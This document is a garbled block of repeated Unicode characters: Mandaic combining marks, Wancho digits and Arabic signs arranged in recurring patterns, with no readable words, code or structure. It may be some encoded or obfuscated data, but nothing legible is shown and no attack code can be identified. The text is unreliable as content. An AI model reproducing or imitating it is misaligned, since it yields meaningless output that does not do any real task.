࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬